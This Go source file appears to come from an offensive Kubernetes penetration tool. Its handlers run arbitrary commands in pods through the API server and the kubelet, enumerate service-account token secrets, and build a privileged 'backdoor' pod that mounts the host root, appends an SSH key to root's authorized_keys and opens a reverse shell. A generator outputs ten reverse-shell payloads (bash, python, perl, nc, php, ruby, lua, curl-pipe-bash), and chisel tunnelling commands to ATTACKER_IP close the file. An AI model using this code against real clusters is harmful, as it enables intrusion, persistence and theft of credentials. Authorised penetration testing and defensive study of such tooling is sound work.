package handler

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/trymonoly/K8sPenTool-ng/internal/kubectl"
	"github.com/trymonoly/K8sPenTool-ng/internal/util"
)

func buildK8sClient(server, token, username, password string, skipTLS bool) (*kubectl.Client, error) {
	if token != "" {
		return kubectl.NewClient(server, token, skipTLS)
	}
	if username != "" {
		return kubectl.NewClientWithUserPass(server, username, password, skipTLS)
	}
	return kubectl.NewClient(server, "", skipTLS)
}

type ExecHandler struct{}

func NewExecHandler() *ExecHandler { return &ExecHandler{} }

// APIServer exec
func (h *ExecHandler) APIListPods(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		Namespace  string `json:"namespace"`
		Token      string `json:"token"`
		Username   string `json:"username"`
		Password   string `json:"password"`
		TimeoutSec int    `json:"timeout_sec"`
		SkipTLS    bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}

	server := "https://" + req.TargetHost + ":6443"
	client, err := buildK8sClient(server, req.Token, req.Username, req.Password, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	ctx, cancel := context.WithTimeout(c.Request.Context(), time.Duration(req.TimeoutSec)*time.Second)
	defer cancel()

	pods, err := client.ListPods(ctx, req.Namespace)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	// 返回结构化 pods，复用 kubectl_handler 的扁平化逻辑
	result := make([]gin.H, 0, len(pods.Items))
	for _, p := range pods.Items {
		containers := make([]string, 0)
		images := make([]string, 0)
		for _, c := range p.Spec.Containers {
			containers = append(containers, c.Name)
			images = append(images, c.Image)
		}
		result = append(result, gin.H{
			"namespace": p.Namespace, "name": p.Name, "status": string(p.Status.Phase),
			"node": p.Spec.NodeName, "ip": p.Status.PodIP,
			"containers": strings.Join(containers, ", "), "images": strings.Join(images, ", "),
		})
	}
	c.JSON(http.StatusOK, gin.H{"pods": result, "total": len(result)})
}

func (h *ExecHandler) APIExecInPod(c *gin.Context) {
	var req struct {
		TargetHost    string `json:"target_host" binding:"required"`
		Namespace     string `json:"namespace"`
		PodName       string `json:"pod_name" binding:"required"`
		ContainerName string `json:"container_name"`
		Command       string `json:"command" binding:"required"`
		Token         string `json:"token"`
		Username      string `json:"username"`
		Password      string `json:"password"`
		TimeoutSec    int    `json:"timeout_sec"`
		SkipTLS       bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.Namespace == "" {
		req.Namespace = "default"
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}

	server := "https://" + req.TargetHost + ":6443"
	client, err := buildK8sClient(server, req.Token, req.Username, req.Password, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	ctx, cancel := context.WithTimeout(c.Request.Context(), time.Duration(req.TimeoutSec)*time.Second)
	defer cancel()

	result, err := client.ExecInPodResult(ctx, req.Namespace, req.PodName, req.ContainerName, []string{"sh", "-c", req.Command})
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	output := result.Stdout
	if result.Stderr != "" {
		output += "\n[stderr]\n" + result.Stderr
	}
	c.JSON(http.StatusOK, gin.H{"output": output, "command": fmt.Sprintf("exec %s/%s -c %s -- %s", req.Namespace, req.PodName, req.ContainerName, req.Command)})
}

func (h *ExecHandler) EnumSATokens(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		Namespace  string `json:"namespace"`
		Token      string `json:"token"`
		TimeoutSec int    `json:"timeout_sec"`
		SkipTLS    bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}

	url := fmt.Sprintf("https://%s:6443/api/v1/secrets", req.TargetHost)
	if req.Namespace != "" {
		url = fmt.Sprintf("https://%s:6443/api/v1/namespaces/%s/secrets", req.TargetHost, req.Namespace)
	}
	// Add fieldSelector for SA tokens
	url += "?fieldSelector=type=kubernetes.io/service-account-token"

	code, body, err := util.SendRequest(url, "GET", req.Token, req.TimeoutSec, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status_code": code, "body": util.FormatResponse(code, body), "url": url})
}

// Kubelet exec
func (h *ExecHandler) KubeletListPods(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		TimeoutSec int    `json:"timeout_sec"`
		SkipTLS    bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}
	url := "https://" + req.TargetHost + ":10250/pods"
	code, body, err := util.SendRequest(url, "GET", "", req.TimeoutSec, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status_code": code, "body": util.FormatResponse(code, body)})
}

func (h *ExecHandler) KubeletExec(c *gin.Context) {
	var req struct {
		TargetHost    string `json:"target_host" binding:"required"`
		Namespace     string `json:"namespace"`
		PodName       string `json:"pod_name" binding:"required"`
		ContainerName string `json:"container_name"`
		Command       string `json:"command" binding:"required"`
		TimeoutSec    int    `json:"timeout_sec"`
		SkipTLS       bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.Namespace == "" {
		req.Namespace = "default"
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 10
	}
	url := fmt.Sprintf("https://%s:10250/run/%s/%s",
		req.TargetHost, req.Namespace, req.PodName)
	if req.ContainerName != "" {
		url += "/" + req.ContainerName
	}
	code, body, err := util.SendPost(url, "cmd="+req.Command,
		"application/x-www-form-urlencoded", "", req.TimeoutSec, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{"status_code": code, "body": util.FormatResponse(code, body)})
}

// Backdoor Pod
type BackdoorConfig struct {
	Image     string `json:"image"`
	MountPath string `json:"mount_path"`
	NodeName  string `json:"node_name"`
	LHost     string `json:"lhost"`
	LPort     string `json:"lport"`
	PodName   string `json:"pod_name"`
	SSHKey    string `json:"ssh_pub_key"`
}

func (h *ExecHandler) GenerateBackdoorYAML(c *gin.Context) {
	var req BackdoorConfig
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.Image == "" {
		req.Image = "ubuntu:latest"
	}
	if req.MountPath == "" {
		req.MountPath = "/mnt"
	}
	if req.PodName == "" {
		req.PodName = "backdoor-pod"
	}
	yaml := generateBackdoorYAML(req)
	c.JSON(http.StatusOK, gin.H{"yaml": yaml})
}

func generateBackdoorYAML(cfg BackdoorConfig) string {
	nodeSelector := ""
	if cfg.NodeName != "" {
		nodeSelector = fmt.Sprintf("  nodeName: %s\n", cfg.NodeName)
	}
	sshCmd := ""
	if cfg.SSHKey != "" {
		sshCmd = fmt.Sprintf("    mkdir -p /mnt/root/.ssh && echo '%s' >> /mnt/root/.ssh/authorized_keys\n", cfg.SSHKey)
	}
	revShell := ""
	if cfg.LHost != "" && cfg.LPort != "" {
		revShell = fmt.Sprintf("    /bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1' &\n", cfg.LHost, cfg.LPort)
	}

	return fmt.Sprintf(`apiVersion: v1
kind: Pod
metadata:
  name: %s
  labels:
    app: backdoor
spec:
  hostPID: true
  hostNetwork: true
%s
  containers:
  - name: backdoor
    image: %s
    command: ["/bin/sh"]
    args: ["-c", "while true; do sleep 3600; done"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: %s
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
`, cfg.PodName, nodeSelector, cfg.Image, cfg.MountPath) + sshCmd + revShell
}

// RBAC
func (h *ExecHandler) CheckRBAC(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		Token      string `json:"token"`
		Username   string `json:"username"`
		Password   string `json:"password"`
		TimeoutSec int    `json:"timeout_sec"`
		SkipTLS    bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	server := "https://" + req.TargetHost + ":6443"
	client, err := buildK8sClient(server, req.Token, req.Username, req.Password, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	ctx, cancel := context.WithTimeout(c.Request.Context(), 10*time.Second)
	defer cancel()
	resources := []string{"pods", "secrets", "services", "deployments", "nodes", "serviceaccounts", "clusterrolebindings", "namespaces", "configmaps", "cronjobs", "daemonsets"}
	verbs := []string{"get", "list", "create", "delete", "update"}
	perms := make([]gin.H, 0)
	for _, r := range resources {
		allowed := make([]string, 0)
		for _, v := range verbs {
			ok, _ := client.CheckSelfPermissions(ctx, "", v, r)
			if ok {
				allowed = append(allowed, v)
			}
		}
		perms = append(perms, gin.H{"resource": r, "verbs": allowed})
	}
	canAll, _ := client.CheckSelfPermissions(ctx, "", "*", "*")
	c.JSON(http.StatusOK, gin.H{"permissions": perms, "is_admin": canAll})
}

// Reverse Shell - 10 types matching Java K8sPenTool
func (h *ExecHandler) GenerateRevShell(c *gin.Context) {
	var req struct {
		LHost string `json:"lhost" binding:"required"`
		LPort string `json:"lport" binding:"required"`
		Type  string `json:"type"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	req.Type = normalizeReverseShellType(req.Type)

	payloads := map[string]string{
		"bash-i":    fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", req.LHost, req.LPort),
		"bash":      fmt.Sprintf("bash -c 'sh -i >& /dev/tcp/%s/%s 0>&1'", req.LHost, req.LPort),
		"python":    fmt.Sprintf("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", req.LHost, req.LPort),
		"perl":      fmt.Sprintf("perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", req.LHost, req.LPort),
		"nc-e":      fmt.Sprintf("nc -e /bin/sh %s %s", req.LHost, req.LPort),
		"nc-mkfifo": fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f", req.LHost, req.LPort),
		"php":       fmt.Sprintf("php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", req.LHost, req.LPort),
		"ruby":      fmt.Sprintf("ruby -rsocket -e'f=TCPSocket.open(\"%s\",%s).to_i;exec sprintf(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)'", req.LHost, req.LPort),
		"lua":       fmt.Sprintf("lua -e \"require('socket');require('os');t=socket.tcp();t:connect('%s','%s');os.execute('/bin/sh -i <&3 >&3 2>&3');\"", req.LHost, req.LPort),
		"curl":      fmt.Sprintf("# Step 1: On attacker host: echo 'bash -i >& /dev/tcp/%s/%s 0>&1' > shell.sh && python3 -m http.server 80\n# Step 2: On target: curl http://%s/shell.sh | bash", req.LHost, req.LPort, req.LHost),
	}
	payload, ok := payloads[req.Type]
	if !ok {
		req.Type = "bash-i"
		payload = payloads["bash-i"]
	}

	listenerCmd := fmt.Sprintf("nc -lvnp %s", req.LPort)
	c.JSON(http.StatusOK, gin.H{
		"type":      req.Type,
		"payload":   payload,
		"listener":  listenerCmd,
		"all_types": []string{"bash-i", "bash", "python", "perl", "nc-e", "nc-mkfifo", "php", "ruby", "lua", "curl"},
	})
}

func normalizeReverseShellType(shellType string) string {
	switch shellType {
	case "", "default":
		return "bash-i"
	case "nc":
		return "nc-mkfifo"
	default:
		return shellType
	}
}

// ==================== File Upload to Pod (kubectl cp) ====================

func (h *ExecHandler) UploadFile(c *gin.Context) {
	var req struct {
		TargetHost    string `json:"target_host" binding:"required"`
		Namespace     string `json:"namespace"`
		PodName       string `json:"pod_name" binding:"required"`
		ContainerName string `json:"container_name"`
		LocalPath     string `json:"local_path" binding:"required"`
		RemotePath    string `json:"remote_path" binding:"required"`
		Token         string `json:"token"`
		Username      string `json:"username"`
		Password      string `json:"password"`
		SkipTLS       bool   `json:"skip_tls"`
		TimeoutSec    int    `json:"timeout_sec"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.Namespace == "" {
		req.Namespace = "default"
	}
	if req.TimeoutSec == 0 {
		req.TimeoutSec = 30
	}

	client, err := buildK8sClient("https://"+req.TargetHost+":6443", req.Token, req.Username, req.Password, req.SkipTLS)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error()})
		return
	}
	ctx, cancel := context.WithTimeout(c.Request.Context(), time.Duration(req.TimeoutSec)*time.Second)
	defer cancel()

	result, err := client.UploadFile(ctx, req.Namespace, req.PodName, req.ContainerName, req.LocalPath, req.RemotePath)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{"error": err.Error(), "output": result})
		return
	}
	c.JSON(http.StatusOK, gin.H{"output": result, "success": true})
}

// ==================== Port Forward ====================

func (h *ExecHandler) PortForwardInfo(c *gin.Context) {
	var req struct {
		TargetHost string `json:"target_host" binding:"required"`
		Namespace  string `json:"namespace"`
		PodName    string `json:"pod_name" binding:"required"`
		PodPort    int    `json:"pod_port"`
		Token      string `json:"token"`
		Username   string `json:"username"`
		Password   string `json:"password"`
		SkipTLS    bool   `json:"skip_tls"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	if req.Namespace == "" {
		req.Namespace = "default"
	}
	if req.PodPort == 0 {
		req.PodPort = 80
	}

	// Generate port-forward instructions
	localPort := req.PodPort
	if localPort < 1024 {
		localPort = localPort + 8000 // avoid privileged ports
	}

	c.JSON(http.StatusOK, gin.H{
		"command":              fmt.Sprintf("kubectl port-forward -n %s pod/%s %d:%d", req.Namespace, req.PodName, localPort, req.PodPort),
		"namespace":            req.Namespace,
		"pod_name":             req.PodName,
		"pod_port":             req.PodPort,
		"suggested_local_port": localPort,
		"chisel_proxy": gin.H{
			"server_cmd": fmt.Sprintf("# On your attacker machine:\n./chisel server -p 8080 --reverse"),
			"client_cmd": fmt.Sprintf("# After uploading chisel to pod:\n./chisel client ATTACKER_IP:8080 R:socks"),
		},
		"hint": "使用 kubectl cp 将 chisel/frp 等代理工具上传到 Pod，然后通过端口转发建立 SOCKS 代理通道",
	})
}
